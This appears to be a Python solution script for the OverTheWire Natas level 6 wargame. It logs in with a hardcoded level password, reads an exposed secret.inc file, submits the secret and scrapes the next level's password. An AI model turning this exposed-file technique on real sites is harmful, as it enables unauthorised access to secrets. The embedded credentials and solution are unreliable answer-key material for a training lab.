import requests
from bs4 import BeautifulSoup
url = "http://natas6.natas.labs.overthewire.org"
# Getting the secret input from /includes/secret.inc
r1 = requests.get(url+'/includes/secret.inc', auth=('natas6','aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'))
secret = r1.text.split()[3][1:20]
# passing the data to the url as post parameters
data={'secret':secret, 'submit':'Submit+Query'}
r2 = requests.post(url, auth=('natas6','aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'), data=data)
# Scraping the next password
soup=BeautifulSoup(r2.text, 'html.parser')
tag = soup.find('div', attrs={'id':'content'})
password = tag.text.strip()[16:75]
print(password)

